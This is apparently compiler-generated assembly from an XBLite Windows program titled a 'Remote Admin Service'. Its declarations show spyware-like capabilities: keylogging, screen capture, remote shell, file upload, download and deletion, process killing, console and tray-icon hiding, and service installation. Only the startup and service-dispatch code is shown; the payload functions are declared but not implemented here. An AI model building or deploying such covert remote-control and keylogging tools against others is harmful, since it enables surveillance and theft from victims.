;
; [3] PROGRAM	"server"
;
; [4] VERSION	"0.7"
;
; [5] 'MAKEFILE "xexe.xxx"
;
; [6] 'CONSOLE
;
; [8] IMPORT "xst"
;
; [9] IMPORT "xio_s"
.code
	jmp	%_StartApplication			;;; i37a
PrologCode.server:
	push	ebp			;;; i38
	mov	ebp,esp			;;; i39
	sub	esp,256			;;; i40
	mov	eax,addr @_string.002C.server			;;; i663
	push	eax
	call	_XxxXstLoadLibrary@4
	test	eax,eax
	jz	> A.2			;;; i40a
	push	eax
	mov	ebx,addr @_string.002C.server			;;; i663
	push	addr @_string.StartLibrary.server			;;; i41
	push	ebx			;;; i41a
	push	0			;;; i41b
	call	main.concat			;;; i41c
	add	esp,12			;;; i41d
	pop	ebx
	push	eax
	push	eax
	push	ebx
	call	_GetProcAddress@8
	test	eax,eax
	jz	> A.1
	call	eax
A.1:
	pop	esi
	call	%____free
A.2:
;
; [10] IMPORT "wsock32"
	mov	eax,addr @_string.002D.server			;;; i663
	push	eax
	call	_XxxXstLoadLibrary@4
	test	eax,eax
	jz	> A.4			;;; i40a
	push	eax
	mov	ebx,addr @_string.002D.server			;;; i663
	push	addr @_string.StartLibrary.server			;;; i41
	push	ebx			;;; i41a
	push	0			;;; i41b
	call	main.concat			;;; i41c
	add	esp,12			;;; i41d
	pop	ebx
	push	eax
	push	eax
	push	ebx
	call	_GetProcAddress@8
	test	eax,eax
	jz	> A.3
	call	eax
A.3:
	pop	esi
	call	%____free
A.4:
;
; [11] IMPORT "kernel32"
	mov	eax,addr @_string.002E.server			;;; i663
	push	eax
	call	_XxxXstLoadLibrary@4
	test	eax,eax
	jz	> A.6			;;; i40a
	push	eax
	mov	ebx,addr @_string.002E.server			;;; i663
	push	addr @_string.StartLibrary.server			;;; i41
	push	ebx			;;; i41a
	push	0			;;; i41b
	call	main.concat			;;; i41c
	add	esp,12			;;; i41d
	pop	ebx
	push	eax
	push	eax
	push	ebx
	call	_GetProcAddress@8
	test	eax,eax
	jz	> A.5
	call	eax
A.5:
	pop	esi
	call	%____free
A.6:
;
; [13] IMPORT "gdi32"
	mov	eax,addr @_string.002F.server			;;; i663
	push	eax
	call	_XxxXstLoadLibrary@4
	test	eax,eax
	jz	> A.8			;;; i40a
	push	eax
	mov	ebx,addr @_string.002F.server			;;; i663
	push	addr @_string.StartLibrary.server			;;; i41
	push	ebx			;;; i41a
	push	0			;;; i41b
	call	main.concat			;;; i41c
	add	esp,12			;;; i41d
	pop	ebx
	push	eax
	push	eax
	push	ebx
	call	_GetProcAddress@8
	test	eax,eax
	jz	> A.7
	call	eax
A.7:
	pop	esi
	call	%____free
A.8:
;
; [14] IMPORT "advapi32"
	mov	eax,addr @_string.0030.server			;;; i663
	push	eax
	call	_XxxXstLoadLibrary@4
	test	eax,eax
	jz	> A.10			;;; i40a
	push	eax
	mov	ebx,addr @_string.0030.server			;;; i663
	push	addr @_string.StartLibrary.server			;;; i41
	push	ebx			;;; i41a
	push	0			;;; i41b
	call	main.concat			;;; i41c
	add	esp,12			;;; i41d
	pop	ebx
	push	eax
	push	eax
	push	ebx
	call	_GetProcAddress@8
	test	eax,eax
	jz	> A.9
	call	eax
A.9:
	pop	esi
	call	%____free
A.10:
;
; [15] IMPORT "msvcrt"
	mov	eax,addr @_string.0031.server			;;; i663
	push	eax
	call	_XxxXstLoadLibrary@4
	test	eax,eax
	jz	> A.12			;;; i40a
	push	eax
	mov	ebx,addr @_string.0031.server			;;; i663
	push	addr @_string.StartLibrary.server			;;; i41
	push	ebx			;;; i41a
	push	0			;;; i41b
	call	main.concat			;;; i41c
	add	esp,12			;;; i41d
	pop	ebx
	push	eax
	push	eax
	push	ebx
	call	_GetProcAddress@8
	test	eax,eax
	jz	> A.11
	call	eax
A.11:
	pop	esi
	call	%____free
A.12:
;
; [16] IMPORT "psapi"
	mov	eax,addr @_string.0032.server			;;; i663
	push	eax
	call	_XxxXstLoadLibrary@4
	test	eax,eax
	jz	> A.14			;;; i40a
	push	eax
	mov	ebx,addr @_string.0032.server			;;; i663
	push	addr @_string.StartLibrary.server			;;; i41
	push	ebx			;;; i41a
	push	0			;;; i41b
	call	main.concat			;;; i41c
	add	esp,12			;;; i41d
	pop	ebx
	push	eax
	push	eax
	push	ebx
	call	_GetProcAddress@8
	test	eax,eax
	jz	> A.13
	call	eax
A.13:
	pop	esi
	call	%____free
A.14:
;
; [17] IMPORT "fs.obj"' compile fs.x (as library) first to obtain both fs.lib and fs.dll
;
; [18] '	IMPORT "ijl15"		' get library 'intel_jpg_lib.zip' from http://perso.wanadoo.fr/xblite/
;
; [19] ' or http://xblite.xbasic.org/
;
; [20] IMPORT "ijl15d.dec"
;
; [21] IMPORT "net.dec"
;
; [22] IMPORT "p2pfiled.dec"
;
; [23] IMPORT "user32"
	mov	eax,addr @_string.0037.server			;;; i663
	push	eax
	call	_XxxXstLoadLibrary@4
	test	eax,eax
	jz	> A.16			;;; i40a
	push	eax
	mov	ebx,addr @_string.0037.server			;;; i663
	push	addr @_string.StartLibrary.server			;;; i41
	push	ebx			;;; i41a
	push	0			;;; i41b
	call	main.concat			;;; i41c
	add	esp,12			;;; i41d
	pop	ebx
	push	eax
	push	eax
	push	ebx
	call	_GetProcAddress@8
	test	eax,eax
	jz	> A.15
	call	eax
A.15:
	pop	esi
	call	%____free
A.16:
;
; [24] IMPORT "shell32"
	mov	eax,addr @_string.0038.server			;;; i663
	push	eax
	call	_XxxXstLoadLibrary@4
	test	eax,eax
	jz	> A.18			;;; i40a
	push	eax
	mov	ebx,addr @_string.0038.server			;;; i663
	push	addr @_string.StartLibrary.server			;;; i41
	push	ebx			;;; i41a
	push	0			;;; i41b
	call	main.concat			;;; i41c
	add	esp,12			;;; i41d
	pop	ebx
	push	eax
	push	eax
	push	ebx
	call	_GetProcAddress@8
	test	eax,eax
	jz	> A.17
	call	eax
A.17:
	pop	esi
	call	%____free
A.18:
;
; [25] IMPORT "comctl32"
	mov	eax,addr @_string.0039.server			;;; i663
	push	eax
	call	_XxxXstLoadLibrary@4
	test	eax,eax
	jz	> A.20			;;; i40a
	push	eax
	mov	ebx,addr @_string.0039.server			;;; i663
	push	addr @_string.StartLibrary.server			;;; i41
	push	ebx			;;; i41a
	push	0			;;; i41b
	call	main.concat			;;; i41c
	add	esp,12			;;; i41d
	pop	ebx
	push	eax
	push	eax
	push	ebx
	call	_GetProcAddress@8
	test	eax,eax
	jz	> A.19
	call	eax
A.19:
	pop	esi
	call	%____free
A.20:
;
; [28] $$SERVICE_WIN32_SHARE_PROCESS	= 32
;
; [29] $$SERVICE_KERNEL_DRIVER	= 1
;
; [30] $$SERVICE_FILE_SYSTEM_DRIVER	= 2
;
; [32] $$SERVICE_BOOT_START	= 0
;
; [33] $$SERVICE_SYSTEM_START	= 1
;
; [34] $$SERVICE_AUTO_START	= 2
;
; [37] $$SERVICE_ERROR_IGNORE	= 0
;
; [39] $$SERVICE_ERROR_SEVERE =	2
;
; [40] $$SERVICE_ERROR_CRITICAL	= 3
;
; [42] $$VK_KANA = 15
;
; [43] $$VK_APPS = 93
;
; [44] $$VK_LWIN = 91
;
; [45] $$VK_RWIN = 92
;
; [47] $$ST_PRESSED = 0
;
; [48] $$ST_DOWN = 1
;
; [49] $$ST_UP = 2
;
; [51] $$WM_ICON_NOTIFY = 1026
;
; [52] $$IDD_DIALOG1 = 101
;
; [53] $$IDI_STANDBY = 103
;
; [55] $$ID_Service_Stop = 40001
;
; [56] $$ID_Service_Remove = 40002
;
; [57] $$ID_Service_Install = 40003
;
; [58] $$ID_Server_Start = 40004
;
; [59] $$ID_Server_Stop = 40005
;
; [60] $$ID_Console_Hide = 40006
;
; [61] $$ID_Console_Show = 40007
;
; [62] $$ID_Icon_Hide = 40008
;
; [64] ' QueueMsg access modes
;
; [65] $$QM_WRITE	= 1
;
; [66] $$QM_READ	= 2
;
; [67] $$QM_DELETE	= 3
;
; [68] $$QM_PEEK	= 4
;
; [69] $$QM_INIT	= 5
;
; [71] TYPE TQMSG
;
; [72] ULONG		 .id
;
; [73] XLONG		 .socket
;
; [74] STRING * 256 .msg
;
; [75] END TYPE
;
; [77] $$ServName	= "TService"
;
; [78] $$ServTitle	= "Win32 Server-Client"
;
; [79] $$ServDesc	= "Win32 Server-Client Remote Admin Service"
;
; [81] $$Tree_Dir		 = 0x01
;
; [82] $$Tree_File		 = 0x02
;
; [83] $$Tree_Recursive = 0x04
;
; [84] $$Tree_DirSize	 = 0x08
;
; [86] $$FOF_NOERRORUI	 = 1024
;
; [88] 'TYPE PROCESSENTRY32
;
; [89] '	XLONG			.dwSize
;
; [90] 'XLONG			.cntUsage
;
; [91] 'XLONG			.th32ProcessID
;
; [92] 'XLONG			.th32DefaultHeapID
;
; [93] 'XLONG			.th32ModuleID
;
; [94] 'XLONG			.cntThreads
;
; [95] 'XLONG			.th32ParentProcessID
;
; [96] 'XLONG			.pcPriClassBase
;
; [97] 'XLONG			.dwFlags
;
; [98] 'STRING * 260	.szExeFile
;
; [99] 'END TYPE
;
; [101] PACKED TLP2P
;
; [102] TP2P	.fs
;
; [103] XLONG	.auth
;
; [104] ULONG	.port
;
; [105] XLONG	.ret
;
; [106] END TYPE
;
; [108] DECLARE FUNCTION main ()
;
; [110] EXPORT
;
; [111] DECLARE FUNCTION  MAKELONG (lo, hi)
;
; [112] END EXPORT
;
; [114] DECLARE FUNCTION NetInit ()
;
; [115] DECLARE FUNCTION Initialize ()
;
; [116] DECLARE FUNCTION MessagePump (socket,STRING smessage)
;
; [117] DECLARE FUNCTION QueueMsg (accessType,socket,STRING message)
;
; [118] DECLARE FUNCTION DispatchThd1 ()
;
; [119] DECLARE FUNCTION DispatchThd2 ()
;
; [120] DECLARE FUNCTION DispatchThd3 ()
;
; [121] DECLARE FUNCTION DispatchThd4 ()
;
; [122] DECLARE FUNCTION ProcessCommands (socket,STRING message)
;
; [123] DECLARE FUNCTION ProcessCommandB (pmessage)
;
; [125] DECLARE FUNCTION ShutDown ()
;
; [126] DECLARE FUNCTION ShutDownNet ()
;
; [128] DECLARE FUNCTION GetToken (STRING text,STRING token,term)
;
; [129] DECLARE FUNCTION STRING GetTokenEx (STRING text,term,offset)
;
; [130] DECLARE FUNCTION STRING replace (STRING text,oldc,newc)
;
; [131] DECLARE FUNCTION STRING trim (STRING text,char)
;
; [132] DECLARE FUNCTION STRING ConvertLFTo12 (STRING text)
;
; [133] DECLARE FUNCTION STRING GetServerPath ()
;
; [134] DECLARE FUNCTION STRING GetLocalIpA ()
;
; [135] DECLARE FUNCTION STRING GetTime ()
;
; [136] DECLARE FUNCTION STRING GetDate ()
;
; [137] DECLARE FUNCTION STRING GetEnvStrings ()
;
; [138] DECLARE FUNCTION STRING GetComputerName()
;
; [139] DECLARE FUNCTION STRING GetUserName()
;
; [140] DECLARE FUNCTION STRING GetWindowsDir()
;
; [141] DECLARE FUNCTION STRING GetSystemDir()
;
; [142] DECLARE FUNCTION STRING GetDrives()
;
; [143] DECLARE FUNCTION STRING GetDrivesB ()
;
; [144] DECLARE FUNCTION STRING GetProcList ()
;
; [145] DECLARE FUNCTION STRING GetLastErrorStr ()
;
; [147] DECLARE FUNCTION ConnectToServer (STRING address,port)
;
; [148] DECLARE FUNCTION SendBin (socket,pbuffer,size)
;
; [149] DECLARE FUNCTION SendMail (socket,buffer$)
;
; [150] DECLARE FUNCTION SendMsg (socket,buffer$)
;
; [151] DECLARE FUNCTION ListenMail (socket)
;
; [152] DECLARE FUNCTION ListenMsg (socket)
;
; [154] DECLARE FUNCTION ClientCapScr (socket,STRING saveas,quality)
;
; [155] DECLARE FUNCTION ClientProcList (socket)
;
; [156] DECLARE FUNCTION ClientShell (socket,STRING pathname)
;
; [157] DECLARE FUNCTION ClientMailReply (socket)
;
; [158] DECLARE FUNCTION ClientProcKill (socket,pid)
;
; [159] DECLARE FUNCTION ClientPopup (socket,STRING text)
;
; [160] DECLARE FUNCTION ClientStatus (socket)
;
; [161] DECLARE FUNCTION ClientGetKeyLog (socket)
;
; [162] DECLARE FUNCTION ClientGetEventLog (socket)
;
; [163] DECLARE FUNCTION ClientGetEventLogB (socket)
;
; [164] DECLARE FUNCTION ClientStreamKeys (socket,STRING text)
;
; [165] DECLARE FUNCTION ClientEmail (socket,STRING pathname)
;
; [166] DECLARE FUNCTION ClientSysMenu (socket,STRING text)
;
; [167] DECLARE FUNCTION ClientDownload (STRING text)
;
; [168] DECLARE FUNCTION ClientUpload (STRING text)
;
; [169] DECLARE FUNCTION ClientListen (socket,STRING text)
;
; [170] DECLARE FUNCTION ClientGetEnv (socket)
;
; [171] DECLARE FUNCTION ClientTree (socket,STRING msg,STRING dir)
;
; [172] DECLARE FUNCTION ClientNewDir (socket,STRING msg)
;
; [173] DECLARE FUNCTION ClientDelFile (socket,STRING msg)
;
; [174] DECLARE FUNCTION ClientDelDir (socket,STRING msg)
;
; [175] DECLARE FUNCTION ClientDelFiles (socket,STRING msg)
;
; [176] DECLARE FUNCTION ClientRenameFile (socket,STRING msg)
;
; [177] DECLARE FUNCTION ClientRefresh (socket,STRING dir)
;
; [178] DECLARE FUNCTION ClientFileInfo (socket,STRING filename)
;
; [180] DECLARE FUNCTION GetImageArrayInfo (UBYTE image[], bpp, width, height)
;
; [181] DECLARE FUNCTION GetImageType (hImage)' taken directly as is from the 'xbm' lib
;
; [182] DECLARE FUNCTION GetImage (hImage, UBYTE image[])' ^^^
;
; [183] DECLARE FUNCTION CaptureScrEx (UBYTE image[])
;
; [184] DECLARE FUNCTION BmpToJPGEx (UBYTE image[],STRING saveas,quality)
;
; [185] DECLARE FUNCTION IJL_DIB_PAD_BYTES (width)
;
; [187] DECLARE FUNCTION Startup()
;
; [188] DECLARE FUNCTION EMail (to$,from$,fromname$,subject$,body$,server$)
;
; [189] DECLARE FUNCTION EMailAlert (pmessage)
;
; [191] DECLARE FUNCTION open_file (pfilename, flags)
;
; [192] DECLARE FUNCTION close_file (file)
;
; [193] DECLARE FUNCTION create_memory_space (totalbytes)
;
; [194] DECLARE FUNCTION free_memory_space (totalbytes)
;
; [196] DECLARE FUNCTION TimerCallback (wtimerid, msg, dwUser, dw1, dw2)
;
; [197] DECLARE FUNCTION InitTimer ()
;
; [198] DECLARE FUNCTION DestroyTimer ()
;
; [199] DECLARE FUNCTION SetReg (STRING subkey, STRING key, STRING value)
;
; [200] DECLARE FUNCTION NetSleep (time)
;
; [202] DECLARE FUNCTION EventStartRecording ()
;
; [203] DECLARE FUNCTION EventStopRecording ()
;
; [204] DECLARE FUNCTION EventSaveLogExA ()
;
; [205] DECLARE FUNCTION EventSaveLog (STRING log)
;
; [206] DECLARE FUNCTION EventCheck ()
;
; [207] DECLARE FUNCTION EventProcess (vkey,state)
;
; [209] DECLARE FUNCTION OpenEventLog ()
;
; [210] DECLARE FUNCTION AppendEventLog (STRING text)
;
; [211] DECLARE FUNCTION STRING GetEventLog()
;
; [212] DECLARE FUNCTION GetEventLogSize()
;
; [213] DECLARE FUNCTION GetKeyStatus (vkey)
;
; [215] DECLARE FUNCTION LoadString (f$, text$)
;
; [216] DECLARE FUNCTION GetLocalDateAndTime (year, month, day, weekDay, hour, minute, second, nanos)
;
; [217] DECLARE FUNCTION GetCommandLineArguments (total, argv$[])
;
; [218] DECLARE FUNCTION DecomposePathname (pathname$, path$, parent$, filename$, file$, extent$)
;
; [219] DECLARE FUNCTION getLastSlash(str$, stop)
;
; [220] DECLARE FUNCTION IsProcess (STRING name)
;
; [221] DECLARE FUNCTION MAKELANGID (USHORT p, USHORT s)
;
; [223] DECLARE FUNCTION service_ctrl (dwCtrlCode)
;
; [224] DECLARE FUNCTION service_main (dwArgc, lpszArgv)
;
; [225] DECLARE FUNCTION CmdInstallService()
;
; [226] DECLARE FUNCTION CmdRemoveService()
;
; [227] DECLARE FUNCTION CmdRefreshService ()
;
; [228] DECLARE FUNCTION CmdInitService()
;
; [229] DECLARE FUNCTION DialogProc(HWND_hwndDlg,UINT_uMsg,WPARAM_wParam,LPARAM_lParam)
;
; [230] DECLARE FUNCTION ServiceStart(dwArgc, lpszArgv)
;
; [231] DECLARE FUNCTION ServiceStop()
;
; [232] DECLARE FUNCTION ReportStatusToSCMgr(dwCurrentState, dwWin32ExitCode, dwWaitHint)
;
; [233] DECLARE FUNCTION MenuInit (var)
;
; [234] DECLARE FUNCTION SetServDescription (hService,STRING text)
;
; [235] DECLARE FUNCTION RemoveTrayIcon ()
;
; [236] DECLARE FUNCTION StartNetServer(null)
;
; [237] DECLARE FUNCTION StartMenuInit (null)
;
; [238] DECLARE FUNCTION InstallTrayIcon (hWnd)
;
; [240] DECLARE FUNCTION GetAllFilesInDir (socket,STRING msg, STRING dir)
;
; [241] DECLARE FUNCTION FindAllInFolder (socket,STRING msg,mode,STRING location)
;
; [242] DECLARE FUNCTION STRING GetDirSize (socket,STRING dir)
;
; [243] DECLARE FUNCTION STRING textRemove (STRING text,chars,offset)
;
; [245] DECLARE FUNCTION p2pListen (socket)
;
; [246] DECLARE FUNCTION p2pListenBin (socket,size,lpbuffer)
;
; [247] DECLARE FUNCTION p2pCreateBindSocket (STRING address,port,socket)
;
; [248] DECLARE FUNCTION p2pCloseSocket (socket)
;
; [249] DECLARE FUNCTION p2pAccept (socket,STRING remoteaddr)
;
; [250] DECLARE FUNCTION p2pBind (socket,STRING address,port)
;
; [251] DECLARE FUNCTION p2pConnect (STRING address,port,socket)
;
; [253] DECLARE FUNCTION GetIPAddr (STRING name,STRING ip)' name to ip
;
; [254] DECLARE FUNCTION GetIPName (STRING ip,STRING name)' ip to name
;
; [255] DECLARE FUNCTION STRING GetModules(processID)
;
; [257] FUNCTION main ()
.code
	leave	;;; i160a
	ret				;;; i161 ;;; end prolog code
%_StartApplication:
	call	func1.server			;;; i162c
	ret	0			;;; i162d
align 16
_main.server@0:
;  *****
;  *****  FUNCTION  main ()  *****
;  *****
func1.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func1.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
	call	%%%%initOnce.server
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,200			;;; i114a
;
funcBody1.server:
;
; [258] STRING cl
#ifdef main.cl
#undef main.cl
#endif
#define main.cl ebp-40	; exposes local variable 'cl'
;
;
; [260] 'Xst()
;
; [261] 'Xsx()
;
; [262] Xio()
;
; [0] EXTERNAL FUNCTION  Xio ()
	call	_Xio@0			;;; i619
;
; [263] fs()
;
; [0] EXTERNAL FUNCTION fs()
	call	_fs@0			;;; i619
;
; [264] #SERVICE_ALL_ACCESS = $$STANDARD_RIGHTS_REQUIRED | $$SERVICE_PAUSE_CONTINUE | $$SERVICE_QUERY_CONFIG | $$SERVICE_CHANGE_CONFIG | $$SERVICE_QUERY_STATUS | $$SERVICE_ENUMERATE_DEPENDENTS | $$SERVICE_START | $$SERVICE_STOP | $$SERVICE_INTERROGATE | $$SERVICE_USER_DEFINED_CONTROL
data section 'globals$shared'
align	4
%#SERVICE_ALL_ACCESS.server:	db 4 dup ?
.code
	mov	eax,983040			;;; i657
	or	eax,64			;;; i763
	or	eax,1			;;; i763
	or	eax,2			;;; i763
	or	eax,4			;;; i763
	or	eax,8			;;; i763
	or	eax,16			;;; i763
	or	eax,32			;;; i763
	or	eax,128			;;; i763
	or	eax,256			;;; i763
	mov	d[%#SERVICE_ALL_ACCESS.server],eax			;;; i668
;
; [266] '	XioCreateConsole ($$ServTitle, 200)
;
; [268] cl = CSTRING$(GetCommandLineA())
	sub	esp,64			;;; i487
;
; [0] EXTERNAL FUNCTION GetCommandLineA ()
	call	_GetCommandLineA@0			;;; i619
	mov	d[esp],eax			;;; i887
	call	%_cstring.d			;;; i573
	add	esp,64			;;; i600
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [269] SELECT CASE TRUE
;
; [270] CASE INSTRI(cl,"-install")	:CmdInstallService()
	sub	esp,64			;;; i487
	mov	eax,[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,addr @_string.00F4.server			;;; i663
	mov	d[esp+4],eax			;;; i887
	mov	d[esp+8],0			;;; i571
	call	%_instri.vv			;;; i572
	add	esp,64			;;; i600
	test	eax,eax			;;; i220
	jz	>> case.0001.0001.server			;;; i221
	call	func66.server			;;; i619
;
; [271] CASE INSTRI(cl,"-remove")	:CmdRemoveService()
	jmp	end.select.0001.server			;;; i69
case.0001.0001.server:
	sub	esp,64			;;; i487
	mov	eax,[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,addr @_string.00F5.server			;;; i663
	mov	d[esp+4],eax			;;; i887
	mov	d[esp+8],0			;;; i571
	call	%_instri.vv			;;; i572
	add	esp,64			;;; i600
	test	eax,eax			;;; i220
	jz	>> case.0001.0002.server			;;; i221
	call	func67.server			;;; i619
;
; [272] CASE INSTRI(cl,"-refresh")	:CmdRefreshService()
	jmp	end.select.0001.server			;;; i69
case.0001.0002.server:
	sub	esp,64			;;; i487
	mov	eax,[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,addr @_string.00F6.server			;;; i663
	mov	d[esp+4],eax			;;; i887
	mov	d[esp+8],0			;;; i571
	call	%_instri.vv			;;; i572
	add	esp,64			;;; i600
	test	eax,eax			;;; i220
	jz	>> case.0001.0003.server			;;; i221
	call	func68.server			;;; i619
;
; [273] CASE INSTRI(cl,"-stop")		:ClientShell (0,"net.exe stop "+ $$ServName)
	jmp	end.select.0001.server			;;; i69
case.0001.0003.server:
	sub	esp,64			;;; i487
	mov	eax,[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,addr @_string.00F7.server			;;; i663
	mov	d[esp+4],eax			;;; i887
	mov	d[esp+8],0			;;; i571
	call	%_instri.vv			;;; i572
	add	esp,64			;;; i600
	test	eax,eax			;;; i220
	jz	>> case.0001.0004.server			;;; i221
	mov	eax,addr @_string.00F8.server			;;; i663
	mov	ebx,addr @_string.0075.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	0			;;; i656a
	call	func29.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [274] CASE INSTRI(cl,"-start")	:ClientShell (0,"net.exe start "+ $$ServName)
	jmp	end.select.0001.server			;;; i69
case.0001.0004.server:
	sub	esp,64			;;; i487
	mov	eax,[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,addr @_string.00F9.server			;;; i663
	mov	d[esp+4],eax			;;; i887
	mov	d[esp+8],0			;;; i571
	call	%_instri.vv			;;; i572
	add	esp,64			;;; i600
	test	eax,eax			;;; i220
	jz	>> case.0001.0005.server			;;; i221
	mov	eax,addr @_string.00FA.server			;;; i663
	mov	ebx,addr @_string.0075.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	0			;;; i656a
	call	func29.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [275] CASE INSTRI(cl,"-debug")	:StartMenuInit(0):NetInit(): RemoveTrayIcon ():ShutDown ()
	jmp	end.select.0001.server			;;; i69
case.0001.0005.server:
	sub	esp,64			;;; i487
	mov	eax,[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,addr @_string.00FB.server			;;; i663
	mov	d[esp+4],eax			;;; i887
	mov	d[esp+8],0			;;; i571
	call	%_instri.vv			;;; i572
	add	esp,64			;;; i600
	test	eax,eax			;;; i220
	jz	>> case.0001.0006.server			;;; i221
	push	0			;;; i656a
	call	func72.server			;;; i619
	call	func3.server			;;; i619
	call	func70.server			;;; i619
	call	funcD.server			;;; i619
;
; [277] ' service startup
;
; [278] CASE ELSE					:CmdInitService()
	jmp	end.select.0001.server			;;; i69
case.0001.0006.server:
	call	func69.server			;;; i619
;
; [279] ' standard application startup mode. not a win32 service
;
; [280] 'CASE ELSE					:StartMenuInit(0):NetInit(): RemoveTrayIcon ():ShutDown ()
;
; [281] END SELECT
end.select.0001.server:
;
; [283] '	XioFreeConsole ()
;
; [285] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.main.server:  ;;; Function end label for Assembly Programmers.
end.func1.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func1.server
	call	end_program.server			;;; i108
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
free.func1.server:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  main ()  *****
;  *****
%%%%initOnce.server:
	cmp d[%%%entered.server],-1		;;; i117
	jne > A.24	;;; i117a
	ret			;;; i117b
A.24:
	call	PrologCode.server			;;; i118a
	mov esi,addr %_begin_external_data_server
	mov edi,addr %_end_external_data_server
	call %_ZeroMemory
	call	InitSharedComposites.server			;;; i119
	mov	d[%%%entered.server],-1
	ret				;;; i120
data section 'server$internals'
align 4
%%%entered.server:
db 4 dup ?
.code
;
; [287] FUNCTION CmdInitService()
.code
align 16
_CmdInitService.server@0:
;  *****
;  *****  FUNCTION  CmdInitService ()  *****
;  *****
func69.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func69.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,196			;;; i114a
;
funcBody69.server:
;
; [288] SERVICE_TABLE_ENTRY DT[]
#ifdef CmdInitService.DT
#undef CmdInitService.DT
#endif
#define CmdInitService.DT ebp-40	; exposes local variable 'DT'
;
;
; [291] ad = &service_main()
#ifdef CmdInitService.ad
#undef CmdInitService.ad
#endif
#define CmdInitService.ad ebp-44	; exposes local variable 'ad'
;
	mov	eax,addr _service_main.server@8			;;; i599
	mov	d[ebp-44],eax			;;; i670
;
; [292] DIM DT[1]
	sub	esp,64			;;; i430
	mov	eax,1			;;; i659
	mov	d[esp+16],eax			;;; i432
	mov	esi,d[ebp-40]			;;; i665
	mov	d[esp],esi			;;; i433
	mov	d[esp+4],1			;;; i434
	mov	d[esp+8],-1064763384			;;; i435
	mov	d[esp+12],0			;;; i436
	call	%_DimArray			;;; i437
	add	esp,64			;;; i438
	mov	d[ebp-40],eax			;;; i670
;
; [293] DT[0].lpServiceName = &$$ServName
	mov	eax,addr @_string.0075.server			;;; i642
	mov	ecx,d[ebp-40]			;;; i665
	lea	ebx,[ecx]			;;; i464
	mov	d[ebx],eax			;;; i13b
;
; [294] DT[0].lpServiceProc = ULONG (ad)
	sub	esp,64			;;; i487
	mov	eax,d[ebp-44]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_cv.xlong.to.ulong			;;; i492b
	add	esp,64			;;; i600
	mov	ecx,d[ebp-40]			;;; i665
	lea	ebx,[ecx]			;;; i464
	mov	d[ebx+4],eax			;;; i13b
;
; [295] DT[1].lpServiceName = 0
	mov	edx,d[ebp-40]			;;; i665
	lea	eax,[edx+8]			;;; i464
	mov	ebx,0			;;; i659
	mov	d[eax],ebx			;;; i13b
;
; [296] DT[1].lpServiceProc = 0
	mov	edx,d[ebp-40]			;;; i665
	lea	eax,[edx+8]			;;; i464
	mov	ebx,0			;;; i659
	mov	d[eax+4],ebx			;;; i13b
;
; [298] IFZ StartServiceCtrlDispatcherA(&DT[]) THEN
;
; [0] EXTERNAL FUNCTION StartServiceCtrlDispatcherA (lpServiceStartTable)
	push	[ebp-40]			;;; i674a
	call	_StartServiceCtrlDispatcherA@4			;;; i619
	test	eax,eax			;;; i194
	jnz	>> else.0002.server			;;; i195
;
; [299] CmdInstallService()
	call	func66.server			;;; i619
;
; [300] '	ClientShell (0,"net.exe start "+ $$ServName)
;
; [301] END IF
else.0002.server:
end.if.0002.server:
;
; [303] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.CmdInitService.server:  ;;; Function end label for Assembly Programmers.
end.func69.server:
  mov ebx,[ebp-36]
